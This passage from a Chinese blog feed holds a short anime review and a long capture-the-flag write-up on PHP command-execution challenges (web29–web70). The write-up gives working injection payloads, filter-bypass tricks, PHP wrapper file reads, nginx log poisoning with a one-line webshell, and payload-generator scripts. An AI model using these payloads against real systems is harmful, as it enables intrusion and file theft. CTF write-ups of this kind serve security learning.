cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucy带David第一次来月球</em></p><p>之前有很多朋友安利过，看到很多同学喜欢这个动漫，看完后不出意料的非常好看 </p><p>最打动我的当然是Lucy和David，David从第一次被Lucy带进月球，就一直记得Lucy最想去月球了，Lucy为了保护David一直在不顾危险的默默的付出，尽管最后并不是完美的结局，不过感动我的是他们存在于细枝末节的温柔。</p><p>当然，不止他们，还有很多令人难忘的角色和出色独特背景设定。</p><p>在大多数科技被顶层垄断的时候，每个人都生活在监控之下，他们是一群游离在社会底层和城市边缘的<em><strong>赛博朋克</strong></em>，他们的梦想可能是自由吧，不过渴求自由似乎太过奢望，不过他们以及很多伙伴都有着属于Cyberpunk的浪漫</p><p>动漫中的Bgm也同样好听：<em>I Really Want to Stay at Your House</em></p><p><strong>一些壁纸↓↓↓</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="David和Lucy🥰" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>David的麻麻😭</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>非常可爱的小女孩</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>大合照</em></p><p><strong>这个世界上没有任何人能完全信任，除了你自己。</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>对不起，我们不能一起上月球了。</strong></p><p><img src="11.png" loading="lazy"><em>David的遗言😭😭😭</em></p><p><strong>赛博朋克不都是在逃避某种可耻人生的逃难者，或是抱着遥远志向而迷失自我的逐梦者吗 ？</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>酷酷的kiwi</em></p><p><strong>回顾过去没有意义。</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EZrce</title>
      <link href="/2024/06/03/EZrce/"/>
      <url>/2024/06/03/EZrce/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><h4 id="用于命令执行的常见姿势"><a href="#用于命令执行的常见姿势" class="headerlink" title="用于命令执行的常见姿势"></a>用于命令执行的常见姿势</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(文件包含漏洞，配合php伪协议)</p><h4 id="一些常见的绕过方式"><a href="#一些常见的绕过方式" class="headerlink" title="一些常见的绕过方式"></a>一些常见的绕过方式</h4><h5 id="Windows支持："><a href="#Windows支持：" class="headerlink" title="Windows支持："></a>Windows支持：</h5><p>|直接执行后面的语句 ping 127.0.0.1|whoami<br>||前面出错执行后面的 ，前面为假 ping 2||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%1a 作为.bat文件的命令分隔符</p><h5 id="Linux支持"><a href="#Linux支持" class="headerlink" title="Linux支持:"></a>Linux支持:</h5><p>;前面的执行完执行后面的 ping 127.0.0.1;whoami<br>|管道符，显示后面的执行结果 ping 127.0.0.1|whoami<br>||当前面的执行出错时执行后面的 ping 1||whoami<br>&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami<br>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami</p><p>%0a 回车</p><p>%0d 换行</p><h5 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h5><p>使用&lt;代替空格</p><p>使用${IFS}代替空格</p><blockquote><p>IFS变量的相关信息：</p><ul><li>Shell把变量IFS内的每一个字符都当做是一个分割符(delimeter)，用这些字符作为每一个字段的结束符来进行分割。</li><li>如果IFS没有设置，或者IFS的值被设置为”\t\n”(space, tab和 newline)，那么操作对象的开始和结束处的所有space, tab和newline序列都将被忽略，但是操作对象中间的space, tab和newline序列会作为界定符工作。</li><li>如果IFS值不是默认值(例如程序中对IFS进行设置过)，只有出现在IFS内的空白字符(可能是space, tab或newline中的一个或几个)才会在单词开始和结束处被忽略，这里说的是单词，而不是整个操作对象。</li><li>IFS内的非空白字符多个连续出现时，每个非空白字符会被当做单独的分隔符看待，但是多个连续的空白字符会被当做一个分隔符看待。</li><li>如果IFS为空(“null”)，则不会进行单词分割。</li></ul></blockquote><p>使用$IFS代替空格</p><h5 id="过滤斜杠-绕过"><a href="#过滤斜杠-绕过" class="headerlink" title="过滤斜杠&#x2F;绕过"></a>过滤斜杠&#x2F;绕过</h5><p>使用${HOME:0:1}代替</p><h5 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h5><p>PHP 伪协议是 PHP 支持的协议与封装协议，几个 PHP 支持的伪协议如下。</p><table><thead><tr><th>伪协议</th><th>功能</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>访问本地文件系统</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>访问 HTTP(s) 网址</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>访问各个输入&#x2F;输出流</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP 归档</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>压缩流</td></tr></tbody></table><p>例如在 allow_url_include &#x3D; on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</p><pre class="language-php" data-language="php"><code class="language-php">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</code></pre><p>稍微解释下这个做法，php:&#x2F;&#x2F;filter&#x2F; 是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F; 表示读取的方式是 base64 编码后，resource&#x3D;index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php:&#x2F;&#x2F;input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</p><h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data 伪协议"></a>data 伪协议</h5><p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</code></pre><h5 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h5><p>1.tee 从标准输入读取，再写入标准输出和文件。</p><p>2.反弹shell</p><p>3.dnslog外带</p><h5 id="下划线的正则绕过"><a href="#下划线的正则绕过" class="headerlink" title="下划线的正则绕过"></a>下划线的正则绕过</h5><p> 这个正则的绕过方法就是利用特性来绕过，可以用</p><p>　[</p><p> (空格)</p><p> + 　</p><p> .</p><p>上面那几个字符任何一个都行，都可以被处理成_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>只是过滤了简单的flag字符，直接使用system函数</p><p>Payload:</p><blockquote><p>1、用egrep效果一样egrep&#x3D;grep  -E<br>c&#x3D;system(“cat fl<em>g.php | grep  -E ‘fl.g’ “);<br>2、此种方式需要右键源代码<br>c&#x3D;system(“cat fl</em>g.php”);<br>3、</p><p>c&#x3D;system(“tac fl<em>g.php”);<br>4、倒序输出文本<br>c&#x3D;system(“tac fl</em>ag.php”);<br>5、<br>c&#x3D;system(“cp fl*g.php a.txt “);<br>访问&#x2F;a.txt<br>6、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br>c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);<br>&#x2F;a.php?c&#x3D;system(“tac flag.php”);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>过滤了system函数，可以用反引号来命令执行</p><p>Payload:</p><blockquote><p>1、nl命令，带着行号输出文本内容<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>单引号：引号里面的内容会原封不动的显示出来（很简单，不做解释）<br>双引号：里面的特殊符号会被解析，变量也会被替换（\ 符号、空格会被解析）<br>echo \a -&gt; a<br>echo “\a” -&gt; \a<br>2、passthru函数，同system，同理exec，shell_exec也可以用，不过有点麻烦<br>c&#x3D;passthru(“cat fla*”);<br>c&#x3D;exec(passthru(“cat fla*”));<br>c&#x3D;shell_exec(passthru(“cat fla*”));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>题目过滤了空格，单引号，小数点，</p><p>过滤了空格，可以使用%09替代；也可以使用{$IFS}，因为单引号被过滤了，所以如果使用c&#x3D;passthru(“cat%09fla*”);或者{$IFS}都不会被解释为空格</p><p>所以构造如下Payload:</p><blockquote><p>1、使用eval嵌套。具体参数：passthru 结合%09，也可以直接rce，因为没有对其他参数进行过滤<br>其中%09绕过空格 ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac%09fla*”); 这里需要注意括号的闭合，&amp;的连接。<br>2、使用参数：passthru结合 $IFS$9<br>其中$IFS$9绕过空格，注意转义$符号 ?<br>$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac$IFS$9fla*”);<br>3、使用未被过滤的命令。passthru直接读取<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); 也就是passthru(“tac$IFS$9fla*”);<br>4、使用pos(localeconv)来获取小数点<br>localeconv可以返回包括小数点在内的一个数组；pos去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c&#x3D;print_r(scandir(pos(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过next取到第二个数组元素，也即flag.php 然后?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginx日志注入"><a href="#web32-nginx日志注入" class="headerlink" title="web32(nginx日志注入)"></a>web32(nginx日志注入)</h4><p>过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号</p><p>所以这里需要使用include来构造Payload:</p><blockquote><p>1、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>其中?&gt;代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag<br>还有一种方法，日志注入<br>2、?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可</p><p>3、?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>也可以使用php:&#x2F;&#x2F;input然后使用post执行命令<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>相比上一关只多过滤了“</p><p>所以web32Payload依旧适用</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>多过滤一个:  之前payload依旧适用</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>多过滤一个&#x3D; &lt;   之前payload依旧适用</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>多过滤了数字  GET参数改为a即可</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php">if(!preg match(&quot;&#x2F;flag&#x2F;i&quot;，$c))&#123;include($c);echo $flag;&#125;</code></pre><blockquote><p>1、使用php:&#x2F;&#x2F;input POST写入php代码</p><?php system("cat fla*")?><p>2、使用data协议</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payload照样打</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125; </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管</p><h4 id="web40-数组函数"><a href="#web40-数组函数" class="headerlink" title="web40(数组函数)"></a>web40(数组函数)</h4><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;     </code></pre><p>这次添加了很多过滤，之前方法大多都不行了</p><blockquote><p>1、c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())</p><p>localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”</p><p>pos():输出数组第一个元素，不改变指针；</p><p>current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样</p><p>scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录</p><p>array_reverse():数组逆置</p><p>next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以</p><p>show_source():查看源码</p><p>pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。</p><p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p>提示：该函数不会移动数组内部指针。</p><p>相关的方法：</p><p>current()返回数组中的当前元素的值。</p><p>end()将内部指针指向数组中的最后一个元素，并输出。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>prev()将内部指针指向数组中的上一个元素，并输出。</p><p>reset()将内部指针指向数组中的第一个元素，并输出。</p><p>each()返回当前元素的键名和键值，并将内部指针向前移动。</p><p>2、c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);</p><p>同理?cmd&#x3D;system(“tac%20flag.php”);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</p><p>next()将内部指针指向数组中的下一个元素，并输出。</p><p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p><p>3、c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>通过cookie获得参数进行命令执行</p><p>受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的。</p></blockquote><h4 id="web41-rce-or"><a href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;        eval(&quot;echo($c);&quot;);    &#125; </code></pre><p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用，同时过滤了字母和数字。但是特意留了个<code>|</code>运算符</p><p>根据正则匹配生成可用字符的集合rce_or.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);$contents&#x3D;&quot;&quot;;for ($i&#x3D;0; $i &lt; 256; $i++) &#123; for ($j&#x3D;0; $j &lt;256 ; $j++) &#123; if($i&lt;16)&#123;$hex_i&#x3D;&#39;0&#39;.dechex($i);&#125;else&#123;$hex_i&#x3D;dechex($i);&#125;if($j&lt;16)&#123;$hex_j&#x3D;&#39;0&#39;.dechex($j);&#125;else&#123;$hex_j&#x3D;dechex($j);&#125;$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;echo &quot;&quot;;    &#125;  else&#123;$a&#x3D;&#39;%&#39;.$hex_i;$b&#x3D;&#39;%&#39;.$hex_j;$c&#x3D;(urldecode($a)|urldecode($b));if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;$contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;&#125;&#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);</code></pre><p>根据可用的字符生成Payload</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osdef action(arg):   s1&#x3D;&quot;&quot;   s2&#x3D;&quot;&quot;   for i in arg:       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)       while True:           t&#x3D;f.readline()           if t&#x3D;&#x3D;&quot;&quot;:               break           if t[0]&#x3D;&#x3D;i:               #print(i)               s1+&#x3D;t[2:5]               s2+&#x3D;t[6:9]               break       f.close()   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;   return(output)   while True:   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))   print(&quot;\n[*] result:\n&quot;+param)</code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php">$c&#x3D;$_GET[&#39;c&#39;];    system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>使用 “ ; “ “ || “ “ &amp; “ “ &amp;&amp; “ 分隔</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显<br>; 分号<br>| 只执行后面那条命令<br>|| 只执行前面那条命令<br>&amp; 两条命令都会执行<br>&amp;&amp; 两条命令都会执行</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>多过滤了cat,\和；，使用其他Payload即可</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>多过滤了flag，使用fla*即可</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>过滤了空格，使用$IFS或者%09绕过即可</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>过滤了$和*，Payload如下：</p><blockquote><p>1、?c&#x3D;nl&lt;fla’’g.php||</p><p>2、?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php">preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail&#x2F;i&quot;, $c)</code></pre><p>Payload:</p><blockquote><p>tac%09fl’’ag.php||</p><p>…….</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php">preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;&#x2F;i&quot;, $c)</code></pre><p>多过滤了一些函数，不过之前Payload可以继续打</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php">preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%&#x2F;i&quot;, $c)</code></pre><p>过滤了%，但是可以&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php">preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c)</code></pre><p>同上</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php">preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26&#x2F;i&quot;, $c)</code></pre><p>ban了tac但是可以用nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>ban了&lt;&gt;，但是可以用$IFS,而且这次flag放在了根目录</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;fl’’ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        echo($c);        $d &#x3D; system($c);        echo &quot;&lt;br&gt;&quot;.$d;    &#125;else&#123;        echo &#39;no&#39;;    &#125;</code></pre><p>Payload:</p><blockquote><p>1、?c&#x3D;ta’’c${IFS}f’’lag.php</p><p>2、s’’ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;</code></pre><p>Payload:</p><blockquote><p>1、?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2、mv flag.php t.txt</p></blockquote><h4 id="web55-无数字字母的命令执行"><a href="#web55-无数字字母的命令执行" class="headerlink" title="web55(无数字字母的命令执行)"></a>web55(无数字字母的命令执行)</h4><pre class="language-php" data-language="php"><code class="language-php">preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c)</code></pre><p>过滤了所有字母</p><p><img src="web55.png" loading="lazy"></p><p>利用post上传文件，然后使用.(source)执行，一般上传后文件在&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[参考文章]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>“无字母数字的命令执行”</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>方法同上</p><h4 id="web57-取反"><a href="#web57-取反" class="headerlink" title="web57(取反)"></a>web57(取反)</h4><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;flag in 36.php preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c)</code></pre><p>过滤了字母数字</p><p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p><p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p><p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;        $c&#x3D; $_POST[&#39;c&#39;];        eval($c);&#125;</code></pre><p>Payload:</p><blockquote><p>1、c&#x3D;show_source(‘flag.php’);</p><p>2、c&#x3D;highlight_file(“flag.php”);</p><p>3、c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4、c&#x3D;include(“flag.php”);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>Payload同上</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>Payload同上</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>Payload同上</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>Payload同上，不过ban了highlight_file函数</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>Payload同上</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>Payload同上</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>ban了show_source,然后使用php伪协议读取flag.php时，源码显示flag不在这，于是使用data协议读取根目录看到flag.txt</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php print_r(scandir(&#39;&#x2F;&#39;));?&gt;</code></pre><p><img src="web65.png" loading="lazy"></p><p>因为大部分直接可以命令执行的函数被ban了，看了wp没想到highlight_file没被ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>Payload同上</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_file被ban了，但是可以直接用php伪协议读取</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>Payload同上</p><p>implode：把数组元素组合为字符串</p><p>冷门函数：读取函数readgzfile：可以读取非gz格式的文件</p><p>Payload：</p><blockquote><p>1、?c&#x3D;echo(implode(‘—‘,scandir(“&#x2F;“)));</p><p>2、?c&#x3D;readgzfile(‘&#x2F;flag.txt’);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>虽然有几个报错但是flag还是出来了</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code 